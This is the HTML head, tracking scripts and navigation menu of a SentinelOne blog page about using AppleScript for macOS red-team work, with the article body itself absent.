<!doctype html>
<html lang="en-US"  class="no-js">
<head>
	
	<script>
		var cookie_free_page = 'https://www.sentinelone.com/global-services/get-support-now/';
		if ( cookie_free_page.substr( 0, 2 ) == '//' ) {
			cookie_free_page = window.location.protocol + cookie_free_page;
		}
		var privacy_policy_page = 'https://www.sentinelone.com/legal/';
		if ( privacy_policy_page.substr( 0, 2 ) == '//' ) {
			privacy_policy_page = window.location.protocol + privacy_policy_page;
		}
		var cookies_rejected = document.cookie.includes( 's1CookiePolicyV2=rejected' );
		var is_cookie_free_page = window.location == cookie_free_page;
		var is_legal_page = window.location.toString().indexOf( privacy_policy_page ) != -1;
		console.log(cookies_rejected, is_cookie_free_page,is_legal_page)
		if ( cookies_rejected && ( is_cookie_free_page == false && is_legal_page == false ) ) {
			console.log( "redirecting to: " + cookie_free_page );
			window.location = cookie_free_page;
			document.write( '<!--' );
		}
	</script>
	
	<meta charset="UTF-8">	
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={licenseKey:"NRJS-7f7a0b93139dcf56f90",applicationID:"773889139"};window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var i=t[n]={exports:{}};e[n][0].call(i.exports,function(t){var i=e[n][1][t];return r(i||t)},i,i.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<n.length;i++)r(n[i]);return r}({1:[function(e,t,n){function r(){}function i(e,t,n){return function(){return o(e,[u.now()].concat(c(arguments)),t?null:this,n),t?void 0:this}}var o=e("handle"),a=e(7),c=e(8),f=e("ee").get("tracer"),u=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],p="api-",l=p+"ixn-";a(d,function(e,t){s[t]=i(p+t,!0,"api")}),s.addPageAction=i(p+"addPageAction",!0),s.setCurrentRouteName=i(p+"routeName",!0),t.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,i="function"==typeof t;return o(l+"tracer",[u.now(),e,n],r),function(){if(f.emit((i?"":"no-")+"fn-start",[u.now(),r,i],n),i)try{return t.apply(this,arguments)}catch(e){throw f.emit("fn-err",[arguments,this,e],n),e}finally{f.emit("fn-end",[u.now()],n)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=i(l+t)}),newrelic.noticeError=function(e,t){"string"==typeof e&&(e=new Error(e)),o("err",[e,u.now(),!1,t])}},{}],2:[function(e,t,n){function r(){return c.exists&&performance.now?Math.round(performance.now()):(o=Math.max((new Date).getTime(),o))-a}function i(){return o}var o=(new Date).getTime(),a=o,c=e(9);t.exports=r,t.exports.offset=a,t.exports.getLastTimestamp=i},{}],3:[function(e,t,n){function r(e){return!(!e||!e.protocol||"file:"===e.protocol)}t.exports=r},{}],4:[function(e,t,n){function r(e,t){var n=e.getEntries();n.forEach(function(e){"first-paint"===e.name?d("timing",["fp",Math.floor(e.startTime)]):"first-contentful-paint"===e.name&&d("timing",["fcp",Math.floor(e.startTime)])})}function i(e,t){var n=e.getEntries();n.length>0&&d("lcp",[n[n.length-1]])}function o(e){e.getEntries().forEach(function(e){e.hadRecentInput||d("cls",[e])})}function a(e){if(e instanceof m&&!g){var t=Math.round(e.timeStamp),n={type:e.type};t<=p.now()?n.fid=p.now()-t:t>p.offset&&t<=Date.now()?(t-=p.offset,n.fid=p.now()-t):t=p.now(),g=!0,d("timing",["fi",t,n])}}function c(e){d("pageHide",[p.now(),e])}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var f,u,s,d=e("handle"),p=e("loader"),l=e(6),m=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){f=new PerformanceObserver(r);try{f.observe({entryTypes:["paint"]})}catch(v){}u=new PerformanceObserver(i);try{u.observe({entryTypes:["largest-contentful-paint"]})}catch(v){}s=new PerformanceObserver(o);try{s.observe({type:"layout-shift",buffered:!0})}catch(v){}}if("addEventListener"in document){var g=!1,w=["click","keydown","mousedown","pointerdown","touchstart"];w.forEach(function(e){document.addEventListener(e,a,!1)})}l(c)}},{}],5:[function(e,t,n){function r(e,t){if(!i)return!1;if(e!==i)return!1;if(!t)return!0;if(!o)return!1;for(var n=o.split("."),r=t.split("."),a=0;a<r.length;a++)if(r[a]!==n[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var c=navigator.userAgent,f=c.match(a);f&&c.indexOf("Chrome")===-1&&c.indexOf("Chromium")===-1&&(i="Safari",o=f[1])}t.exports={agent:i,version:o,match:r}},{}],6:[function(e,t,n){function r(e){function t(){e(a&&document[a]?document[a]:document[i]?"hidden":"visible")}"addEventListener"in document&&o&&document.addEventListener(o,t,!1)}t.exports=r;var i,o,a;"undefined"!=typeof document.hidden?(i="hidden",o="visibilitychange",a="visibilityState"):"undefined"!=typeof document.msHidden?(i="msHidden",o="msvisibilitychange"):"undefined"!=typeof document.webkitHidden&&(i="webkitHidden",o="webkitvisibilitychange",a="webkitVisibilityState")},{}],7:[function(e,t,n){function r(e,t){var n=[],r="",o=0;for(r in e)i.call(e,r)&&(n[o]=t(r,e[r]),o+=1);return n}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],8:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,i=n-t||0,o=Array(i<0?0:i);++r<i;)o[r]=e[t+r];return o}t.exports=r},{}],9:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,t,n){function r(){}function i(e){function t(e){return e&&e instanceof r?e:e?u(e,f,a):a()}function n(n,r,i,o,a){if(a!==!1&&(a=!0),!l.aborted||o){e&&a&&e(n,r,i);for(var c=t(i),f=v(n),u=f.length,s=0;s<u;s++)f[s].apply(c,r);var p=d[h[n]];return p&&p.push([b,n,r,c]),c}}function o(e,t){y[e]=v(e).concat(t)}function m(e,t){var n=y[e];if(n)for(var r=0;r<n.length;r++)n[r]===t&&n.splice(r,1)}function v(e){return y[e]||[]}function g(e){return p[e]=p[e]||i(n)}function w(e,t){s(e,function(e,n){t=t||"feature",h[n]=t,t in d||(d[t]=[])})}var y={},h={},b={on:o,addEventListener:o,removeEventListener:m,emit:n,get:g,listeners:v,context:t,buffer:w,abort:c,aborted:!1};return b}function o(e){return u(e,f,a)}function a(){return new r}function c(){(d.api||d.feature)&&(l.aborted=!0,d=l.backlog={})}var f="nr@context",u=e("gos"),s=e(7),d={},p={},l=t.exports=i();t.exports.getOrSetContext=o,l.backlog=d},{}],gos:[function(e,t,n){function r(e,t,n){if(i.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return e[t]=r,r}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){i.buffer([e],r),i.emit(e,t,n)}var i=e("ee").get("handle");t.exports=r,r.ee=i},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,o,function(){return i++})}var i=1,o="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!E++){var e=x.info=NREUM.info,t=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return u.abort();f(h,function(t,n){e[t]||(e[t]=n)});var n=a();c("mark",["onload",n+x.offset],null,"api"),c("timing",["load",n]);var r=l.createElement("script");r.src="https://"+e.agent,t.parentNode.insertBefore(r,t)}}function i(){"complete"===l.readyState&&o()}function o(){c("mark",["domContent",a()+x.offset],null,"api")}var a=e(2),c=e("handle"),f=e(7),u=e("ee"),s=e(5),d=e(3),p=window,l=p.document,m="addEventListener",v="attachEvent",g=p.XMLHttpRequest,w=g&&g.prototype;if(d(p.location)){NREUM.o={ST:setTimeout,SI:p.setImmediate,CT:clearTimeout,XHR:g,REQ:p.Request,EV:p.Event,PR:p.Promise,MO:p.MutationObserver};var y=""+location,h={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1208.min.js"},b=g&&w&&w[m]&&!/CriOS/.test(navigator.userAgent),x=t.exports={offset:a.getLastTimestamp(),now:a,origin:y,features:{},xhrWrappable:b,userAgent:s};e(1),e(4),l[m]?(l[m]("DOMContentLoaded",o,!1),p[m]("load",r,!1)):(l[v]("onreadystatechange",i),p[v]("onload",r)),c("mark",["firstbyte",a.getLastTimestamp()],null,"api");var E=0}},{}],"wrap-function":[function(e,t,n){function r(e,t){function n(t,n,r,f,u){function nrWrapper(){var o,a,s,p;try{a=this,o=d(arguments),s="function"==typeof r?r(o,a):r||{}}catch(l){i([l,"",[o,a,f],s],e)}c(n+"start",[o,a,f],s,u);try{return p=t.apply(a,o)}catch(m){throw c(n+"err",[o,a,m],s,u),m}finally{c(n+"end",[o,a,p],s,u)}}return a(t)?t:(n||(n=""),nrWrapper[p]=t,o(t,nrWrapper,e),nrWrapper)}function r(e,t,r,i,o){r||(r="");var c,f,u,s="-"===r.charAt(0);for(u=0;u<t.length;u++)f=t[u],c=e[f],a(c)||(e[f]=n(c,s?f+r:r,i,f,o))}function c(n,r,o,a){if(!m||t){var c=m;m=!0;try{e.emit(n,r,o,t,a)}catch(f){i([f,n,r,o],e)}m=c}}return e||(e=s),n.inPlace=r,n.flag=p,n}function i(e,t){t||(t=s);try{t.emit("internal-error",e)}catch(n){}}function o(e,t,n){if(Object.defineProperty&&Object.keys)try{var r=Object.keys(e);return r.forEach(function(n){Object.defineProperty(t,n,{get:function(){return e[n]},set:function(t){return e[n]=t,t}})}),t}catch(o){i([o],n)}for(var a in e)l.call(e,a)&&(t[a]=e[a]);return t}function a(e){return!(e&&e instanceof Function&&e.apply&&!e[p])}function c(e,t){var n=t(e);return n[p]=e,o(e,n,s),n}function f(e,t,n){var r=e[t];e[t]=c(r,n)}function u(){for(var e=arguments.length,t=new Array(e),n=0;n<e;++n)t[n]=arguments[n];return t}var s=e("ee"),d=e(8),p="nr@original",l=Object.prototype.hasOwnProperty,m=!1;t.exports=r,t.exports.wrapFunction=c,t.exports.wrapInPlace=f,t.exports.argsToArray=u},{}]},{},["loader"]);</script>
	<meta name="viewport" content="width=device-width,initial-scale=1">
	
	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
	<link rel="manifest" href="/site.webmanifest">
	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5b0fde">
	<meta name="msapplication-TileColor" content="#5b0fde">
	<meta name="theme-color" content="#ffffff">
	
	<link href="//ajax.googleapis.com" rel="dns-prefetch">
	
	<link rel="alternate" href="https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/" hreflang="en" />
	
	<title>macOS Red Team: Calling Apple APIs Without Building Binaries - SentinelOne</title>

<!-- This site is optimized with the Yoast SEO Premium plugin v11.8 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="AppleScript is the PowerShell of macOS but with more power and less scrutiny. Red teamers can emulate fileless attacks, build fast scripts &amp; call Apple APIs"/>
<link rel="canonical" href="https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="macOS Red Team: Calling Apple APIs Without Building Binaries - SentinelOne" />
<meta property="og:description" content="AppleScript is the PowerShell of macOS but with more power and less scrutiny. Red teamers can emulate fileless attacks, build fast scripts &amp; call Apple APIs" />
<meta property="og:url" content="https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/" />
<meta property="og:site_name" content="SentinelOne" />
<meta property="article:tag" content="macOS" />
<meta property="article:tag" content="phishing" />
<meta property="article:tag" content="post-exploitation" />
<meta property="article:tag" content="red team" />
<meta property="article:section" content="Security" />
<meta property="article:published_time" content="2019-12-05T17:00:42-08:00" />
<meta property="article:modified_time" content="2019-12-16T04:57:03-08:00" />
<meta property="og:updated_time" content="2019-12-16T04:57:03-08:00" />
<meta property="og:image" content="https://www.sentinelone.com/wp-content/uploads/2019/12/macOS-Red-Team_-Calling-Apple-APIs-Without-Building-Binaries-6.jpg" />
<meta property="og:image:secure_url" content="https://www.sentinelone.com/wp-content/uploads/2019/12/macOS-Red-Team_-Calling-Apple-APIs-Without-Building-Binaries-6.jpg" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="628" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="AppleScript is the PowerShell of macOS but with more power and less scrutiny. Red teamers can emulate fileless attacks, build fast scripts &amp; call Apple APIs" />
<meta name="twitter:title" content="macOS Red Team: Calling Apple APIs Without Building Binaries - SentinelOne" />
<meta name="twitter:image" content="https://www.sentinelone.com/wp-content/uploads/2019/12/macOS-Red-Team_-Calling-Apple-APIs-Without-Building-Binaries-6.jpg" />
<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://www.sentinelone.com/#website","url":"https://www.sentinelone.com/","name":"SentinelOne","potentialAction":{"@type":"SearchAction","target":"https://www.sentinelone.com/?s={search_term_string}","query-input":"required name=search_term_string"}},{"@type":"ImageObject","@id":"https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/#primaryimage","url":"https://www.sentinelone.com/wp-content/uploads/2019/12/macOS-Red-Team_-Calling-Apple-APIs-Without-Building-Binaries-7.jpg","width":1200,"height":628,"caption":"feature image Apple APIs"},{"@type":"WebPage","@id":"https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/#webpage","url":"https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/","inLanguage":"en-US","name":"macOS Red Team: Calling Apple APIs Without Building Binaries - SentinelOne","isPartOf":{"@id":"https://www.sentinelone.com/#website"},"primaryImageOfPage":{"@id":"https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/#primaryimage"},"datePublished":"2019-12-05T17:00:42-08:00","dateModified":"2019-12-16T04:57:03-08:00","author":{"@id":"https://www.sentinelone.com/#/schema/person/489520f5d53975db6b6f292dee001a87"},"description":"AppleScript is the PowerShell of macOS but with more power and less scrutiny. Red teamers can emulate fileless attacks, build fast scripts & call Apple APIs"},{"@type":["Person"],"@id":"https://www.sentinelone.com/#/schema/person/489520f5d53975db6b6f292dee001a87","name":"Phil Stokes","image":{"@type":"ImageObject","@id":"https://www.sentinelone.com/#authorlogo","url":"https://secure.gravatar.com/avatar/988f7b3ecd37145cc3e640511359a285?s=96&d=mm&r=g","caption":"Phil Stokes"},"sameAs":[]}]}</script>
<!-- / Yoast SEO Premium plugin. -->

<link rel='dns-prefetch' href='//www.sentinelone.com' />
<link rel='dns-prefetch' href='//go.sentinelone.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//cloud.typography.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//899029.smushcdn.com' />
<link rel="alternate" type="application/rss+xml" title="SentinelOne &raquo; Feed" href="https://www.sentinelone.com/feed/" />
<link rel='stylesheet' id='carbine-font-body-css'  href='https://fonts.googleapis.com/css?family=IBM+Plex+Sans:400,400i,700,700i' type='text/css' media='all' />
<link rel='stylesheet' id='carbine-font-heading-css'  href='https://cloud.typography.com/7197018/6979812/css/fonts.css' type='text/css' media='all' />
<link rel='stylesheet' id='carbine-style-css'  href='https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/css/style.min.css?ver=1621730643' type='text/css' media='all' />
<script type='text/javascript' src='https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/js/jquery-3.5.1.min.js' id='jquery-core-js'></script>
<script type='text/javascript' src='//go.sentinelone.com/js/forms2/js/forms2.min.js' id='marketo-forms-js'></script>
<script type='text/javascript' src='https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/js/header.min.js?ver=1621730643' id='carbine-script-header-js'></script>
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.sentinelone.com/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='https://www.sentinelone.com/?p=26227' />
<style>
.mega .panel img {
    max-width: 285px;
}
#menu-item-40019 {
    margin-bottom: 50px;
}
#menu-item-40015 > .mega > .container > .panel > a:nth-child(even) {
    font-size: 14px;
    padding: 12px 50px 12px 26px;
    background-color: #6b0aea;
    border-radius: 2px;
    letter-spacing: .15em;
    text-transform: uppercase;
    font-weight: 500;
    line-height: 15px;
    background-position: 86%;
    transition: color .3s,padding-right .3s;
    margin-top: .5rem;
}
#menu-item-40015 > .mega > .container > .panel > a:nth-child(even):hover {
    padding: 12px 60px 12px 26px;
    color: #fff;
}
.rev_slider .dione.tparrows:hover {
    background: none !important;
}
.rev_slider .dione.tparrows:hover {
    background: none !important;
}
#content .text-blog .inverted {
    font-weight: 400;
    background: #7e4aac;
    padding: 15px;
    border-radius: 6px;
    color: #fff !important;
    display: block;
}
#content .text-blog .inverted a {
    color: #fff !important;
    text-decoration: underline;
}
#content .text-blog .inverted a:hover {
    color: #fff !important;
    text-decoration: underline;
}
.page-id-23924 .xup_blocks.simple-gotham .entries, .xup_blocks.simple .entries {
    justify-content: center;
}
.code-wrap table {
		width: 100%;
		border-collapse: collapse;
		border: 1px solid #ddd;
		border-radius: 0;
		background: #fff;
		box-shadow: 3px 3px 0px 0px rgba(0,0,0,0.03);
}
.code-wrap td, .code-wrap th {
			border: 1px solid #dee2e6;
			padding: 10px;
}
</style>

<!-- Begin TVSquared Tracking Code -->
<script type="text/javascript">
	var _tvq = window._tvq = window._tvq || [];
	(function() {
		var u = (("https:" == document.location.protocol) ? "https://collector-5527.tvsquared.com/" : "http://collector-5527.tvsquared.com/");
		_tvq.push(['setSiteId', "TV-45457227-1"]);
		_tvq.push(['setTrackerUrl', u + 'tv2track.php']);
		_tvq.push([function() {
			this.deleteCustomVariable(5, 'page')
		}]);
		_tvq.push(['trackPageView']);
		var d = document,
			g = d.createElement('script'),
			s = d.getElementsByTagName('script')[0];
		g.type = 'text/javascript';
		g.defer = true;
		g.async = true;
		g.src = u + 'tv2track.js';
		s.parentNode.insertBefore(g, s);
	})();
</script>
<!-- End TVSquared Tracking Code -->

<!-- Start 6 Sense Code -->
<script>
	window._6si = window._6si || [];
	window._6si.push(['enableEventTracking', true]);
	window._6si.push(['setToken', '3576c97e67a9b7f8553a44ff1cc54791']);
	window._6si.push(['setEndpoint', 'b.6sc.co']);
	(function() {
		var gd = document.createElement('script');
		gd.type = 'text/javascript';gd.async = true;
		gd.src = '//j.6sc.co/6si.min.js';
		var s = document.getElementsByTagName('script')[0];
		s.parentNode.insertBefore(gd, s);
	})();
</script>
<!-- End 6 Sense Code -->
      <meta name="onesignal" content="wordpress-plugin"/>
            <script>

      window.OneSignal = window.OneSignal || [];

      OneSignal.push( function() {
        OneSignal.SERVICE_WORKER_UPDATER_PATH = "OneSignalSDKUpdaterWorker.js.php";
                      OneSignal.SERVICE_WORKER_PATH = "OneSignalSDKWorker.js.php";
                      OneSignal.SERVICE_WORKER_PARAM = { scope: "/" };
        OneSignal.setDefaultNotificationUrl("https://www.sentinelone.com");
        var oneSignal_options = {};
        window._oneSignalInitOptions = oneSignal_options;

        oneSignal_options['wordpress'] = true;
oneSignal_options['appId'] = 'acaf2329-c613-4dbe-a651-1ed5a45c3762';
oneSignal_options['allowLocalhostAsSecureOrigin'] = true;
oneSignal_options['welcomeNotification'] = { };
oneSignal_options['welcomeNotification']['disable'] = true;
oneSignal_options['path'] = "https://www.sentinelone.com/wp-content/plugins/onesignal-free-web-push-notifications/sdk_files/";
oneSignal_options['persistNotification'] = true;
oneSignal_options['promptOptions'] = { };
                OneSignal.init(window._oneSignalInitOptions);
                OneSignal.showSlidedownPrompt();      });

      function documentInitOneSignal() {
        var oneSignal_elements = document.getElementsByClassName("OneSignal-prompt");

        var oneSignalLinkClickHandler = function(event) { OneSignal.push(['registerForPushNotifications']); event.preventDefault(); };        for(var i = 0; i < oneSignal_elements.length; i++)
          oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false);
      }

      if (document.readyState === 'complete') {
           documentInitOneSignal();
      }
      else {
           window.addEventListener("load", function(event){
               documentInitOneSignal();
          });
      }
    </script>
	
		<!-- Google Tag Manager -->
	<script>
		(function($) {
			(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
			new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
			j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
			'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
			})(window,document,'script','dataLayer','GTM-KGGXSJ');
		})(jQuery);
	</script>
	<!-- End Google Tag Manager -->
		
				
		
		
	<script>
		var $ = jQuery.noConflict();
	</script>
	
</head>
<body class="post-template-default single single-post postid-26227 single-format-standard site-www">
	
		<!-- Google Tag Manager (noscript) -->
	<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KGGXSJ" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
	<!-- End Google Tag Manager (noscript) -->
		
		<header class="header hasbanner">
		
				<div class="banner">
			<div class="container">
				<div class="wide">
					<span>SentinelOne Named a Leader in the 2021 Gartner Magic Quadrant for Endpoint Protection Platforms</span>
					<a class="" href="https://www.sentinelone.com/lp/gartnermq/" target="_blank">
						Learn More					</a>
				</div>
				<div class="narrow">
					<a class="" href="https://www.sentinelone.com/lp/gartnermq/" target="_blank">
						SentinelOne Named a Leader in the 2021 Gartner Magic Quadrant for Endpoint Protection Platforms					</a>
				</div>
			</div>
		</div>
				
		<div class="top-bar">
			<div class="container">
				<div class="container-inner">
					<div class="top-bar-wrap">
												<span class="breach">Experiencing a Breach?</span>
						<div class="menu-top-bar-container"><ul id="menu-top-bar" class="menu"><li id="menu-item-16921" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-16921"><a href="#s1phone">1-855-868-3733</a></li>
<li id="menu-item-25727" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-25727"><a href="/contact/">Contact</a></li>
<li id="menu-item-16923" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-16923"><a href="https://www.sentinelone.com/blog/">Blog</a></li>
</ul></div>						<button class="search">
							<span class="light">
								<img src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/search-icon-white.svg" />
							</span>
							<span class="dark">
								<img src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/search-icon.svg" />
							</span>
						</button>
						<div class="search-form">
							<form autocomplete="off" method="get" action="https://www.sentinelone.com" >
								<fieldset>
									<input type="search" name="s" placeholder="Search ..." value="" />
									<button class="search" type="submit">
										<span class="light">
											<img class="icon-search" src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/search-icon-white.svg" />
											<img class="icon-down" src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/navigation-close.svg" />
										</span>
										<span class="dark">
											<img class="icon-search" src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/search-icon.svg" />
											<img class="icon-down" src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/navigation-close-dark.svg" />
										</span>
									</button>
								</fieldset>
							</form>
						</div>
											</div>
				</div>
									<div class="lang-select">
		<span class="label">en</span>
		<ul>
	<li class="current"><span href="https://www.sentinelone.com//">English</span></li><li class=""><a href="https://jp.sentinelone.com//">日本語</a></li><li class=""><a href="https://de.sentinelone.com//">Deutsch</a></li><li class=""><a href="https://es.sentinelone.com//">Español</a></li><li class=""><a href="https://fr.sentinelone.com//">Français</a></li><li class=""><a href="https://it.sentinelone.com//">Italiano</a></li><li class=""><a href="https://nl.sentinelone.com//">Dutch</a></li><li class=""><a href="https://kr.sentinelone.com//">한국어</a></li>		</ul>
	</div>
								</div>
		</div>
			
		<div class="navigation">
			<div class="container">
				<div class="logo fadein animated">
					<a href="/">
						<img class="light" src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/s1-logo-color-light.svg" />
						<img src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/s1-logo-color.svg" />
												<span class="tag wow fadeIn">blog</span>
											</a>
				</div>
				<div class="nav-holder">
										<a class="demo fadein animated" href="/request-demo/">Get a Demo</a>
															<div class="menu-toggle"><a href="#"><span></span></a></div>
										<div class="nav-frame fadein animated delay-1s">
												<div class="menu-carbine-primary-container"><ul id="menu-carbine-primary" class="menu"><li id="menu-item-34979" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-34979"><a href="https://www.sentinelone.com/platform/">Platform</a><div class="mega"><div class="container"><div class="panel"><img src="https://www.sentinelone.com/wp-content/uploads/2017/06/singularity-white.svg" /><div class="blurb">The SentinelOne platform delivers the defenses you need to prevent, detect, and undo—known and unknown—threats.</div><a href="https://www.sentinelone.com/platform/">Platform Overview</a><a href="https://www.sentinelone.com/platform-packages/" target="">Platform Packages</a><a href="https://www.sentinelone.com/vs/crowdstrike/" target="">SentinelOne vs CrowdStrike</a><div class="bg"></div></div><div class="menu-wrap-outer"><div class="menu-wrap bp6"><div class="subtitle">Platform Products</div>
<ul class="sub-menu">
	<li id="menu-item-35909" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35909"><a href="https://www.sentinelone.com/platform/singularity-complete/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/platform/singularity-complete/"></a><a class="combined d-0" href="https://www.sentinelone.com/platform/singularity-complete/"><strong>Singularity</strong> Complete</a><span class="subtitle">The Future's Enterprise Security Platform</span><div class="bg"></div></li>
	<li id="menu-item-35912" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35912"><a href="https://www.sentinelone.com/platform/singularity-control/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/platform/singularity-control/"></a><a class="combined d-1" href="https://www.sentinelone.com/platform/singularity-control/"><strong>Singularity</strong> Control</a><span class="subtitle">Security with Suite Features</span><div class="bg"></div></li>
	<li id="menu-item-35913" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35913"><a href="https://www.sentinelone.com/platform/singularity-core/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/platform/singularity-core/"></a><a class="combined d-2" href="https://www.sentinelone.com/platform/singularity-core/"><strong>Singularity</strong> Core</a><span class="subtitle">Cloud-Native NGAV</span><div class="bg"></div></li>
	<li id="menu-item-41497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41497"><a href="/singularity-xdr/">Singularity</a><a class="link-wrap" href="/singularity-xdr/"></a><a class="combined d-3" href="/singularity-xdr/"><strong>Singularity</strong> XDR</a><span class="subtitle">Extended Detection & Response</span><div class="bg"></div></li>
	<li id="menu-item-35911" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35911"><a href="https://www.sentinelone.com/platform/singularity-ranger-iot/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/platform/singularity-ranger-iot/"></a><a class="combined d-4" href="https://www.sentinelone.com/platform/singularity-ranger-iot/"><strong>Singularity</strong> Ranger IoT</a><span class="subtitle">Network Visibility & Control</span><div class="bg"></div></li>
	<li id="menu-item-35910" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35910"><a href="https://www.sentinelone.com/platform/singularity-cloud/">Singularity</a><a class="link-wrap" href="https://www.sentinelone.com/platform/singularity-cloud/"></a><a class="combined d-5" href="https://www.sentinelone.com/platform/singularity-cloud/"><strong>Singularity</strong> Cloud</a><span class="subtitle">Container & Cloud Workload Security</span><div class="bg"></div></li>
</ul></div><div class="menu-wrap secondary"><div class="subtitle">Platform Verticals</div><ul class="sub-menu">	<li id="menu-item-37383" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37383"><a href="https://www.sentinelone.com/platform/energy/">Energy</a></li>
	<li id="menu-item-37384" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37384"><a href="https://www.sentinelone.com/platform/finance/">Finance</a></li>
	<li id="menu-item-37387" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37387"><a href="https://www.sentinelone.com/platform/healthcare/">Healthcare</a></li>
	<li id="menu-item-37385" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37385"><a href="https://www.sentinelone.com/platform/highereducation/">Higher Education</a></li>
	<li id="menu-item-37386" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37386"><a href="https://www.sentinelone.com/platform/retail/">Retail</a></li>
	<li id="menu-item-41084" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41084"><a href="https://www.sentinelone.com/platform/manufacturing/">Manufacturing</a></li>
</ul>
</div></div></div></div></li>
<li id="menu-item-30696" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30696"><a href="https://www.sentinelone.com/customer-page/">Our Customers</a></li>
